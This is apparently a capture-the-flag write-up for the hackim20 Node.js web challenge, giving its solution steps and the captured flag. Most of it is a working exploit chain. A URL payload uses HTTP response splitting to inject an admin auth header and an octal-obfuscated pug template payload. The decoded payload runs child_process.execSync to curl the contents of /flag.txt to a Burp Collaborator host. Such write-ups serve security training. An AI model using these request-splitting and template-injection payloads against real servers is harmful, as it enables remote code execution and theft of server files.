## Run

1. ./start.sh

## Solution

1. Get source via /source 
2. Http Response splitting via http library in q parameter. 
    ref https://hackerone.com/reports/409943
3. Need to set arbitary header for admin auth and pug
4. Need to create a payload without characters for pug RCE


## Payload
```
http://192.168.29.182:8081/core?q=t%C4%A0HTTP%2F1.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Fflag%C4%A0HTTP%2F1.1%C4%8D%C4%8Aadminauth%3Asecretpassword%C4%8D%C4%8Apug%3A%C4%A0-[][%2522\143\157\156\163\164\162\165\143\164\157\162%2522][%2522\143\157\156\163\164\162\165\143\164\157\162%2522](%2522\166\141\162\40\170\40\75\40\147\154\157\142\141\154\56\160\162\157\143\145\163\163\56\155\141\151\156\115\157\144\165\154\145\56\162\145\161\165\151\162\145\50\42\143\150\151\154\144\137\160\162\157\143\145\163\163\42\51\56\145\170\145\143\123\171\156\143\50\42\143\165\162\154\40\60\143\144\141\164\60\62\164\161\165\62\70\170\161\172\171\170\61\66\143\141\67\152\155\164\144\172\63\156\163\56\142\165\162\160\143\157\154\154\141\142\157\162\141\164\157\162\56\156\145\164\40\55\130\40\120\117\123\124\40\55\144\40\140\143\141\164\40\57\146\154\141\147\56\164\170\164\140\42\51\56\164\157\123\164\162\151\156\147\50\51\73\143\157\156\163\157\154\145\56\154\157\147\50\170\51%2522)()%C4%8D%C4%8Acheck%3alll

```

## pug payload

* Convert all characters to octal
```
- []["constructor"]["constructor"]("var x = global.process.mainModule.require("child_process").execSync("curl 0cdat02tqu28xqzyx16ca7jmtdz3ns.burpcollaborator.net -X POST -d `cat /flag.txt`").toString();console.log(x)")()

```

## Flag
hackim20{You_must_be_1337_in_JavaScript!}
